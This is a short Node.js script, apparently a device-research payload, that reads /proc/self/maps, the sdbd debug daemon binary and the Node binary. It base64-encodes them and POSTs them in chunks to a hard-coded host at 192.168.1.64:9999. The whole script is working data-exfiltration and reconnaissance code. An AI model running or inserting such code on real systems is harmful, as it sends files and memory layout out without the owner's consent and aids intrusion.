"use strict";

var cp = require("child_process");
var http = require("http");
var fs = require("fs");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

out.maps = run("cat /proc/self/maps");
out.node_maps = run("LD_PRELOAD= /usr/bin/node -e 'console.log(require(\"fs\").readFileSync(\"/proc/self/maps\",\"utf8\"))' 2>&1");

var sdbd = fs.readFileSync("/usr/sbin/sdbd");
post("/audit18_files", { sdbd: sdbd.toString("base64"), maps: out.maps, node_maps: out.node_maps });

var NODE = "/usr/bin/node";
var st = fs.statSync(NODE);
out.node_size = st.size;
var CHUNK = 2542735;
var fd = fs.openSync(NODE, "r");
var buf = new Buffer(CHUNK);
for (var i = 0; i * CHUNK < st.size; i++) {
    var n = fs.readSync(fd, buf, 0, CHUNK, i * CHUNK);
    if (n > 0) {
        var part = buf.slice(0, n);
        post("/audit18_node_" + i, { part: i, offset: i * CHUNK, size: n, b64: part.toString("base64") });
    }
}
fs.closeSync(fd);

post("/audit18", out);
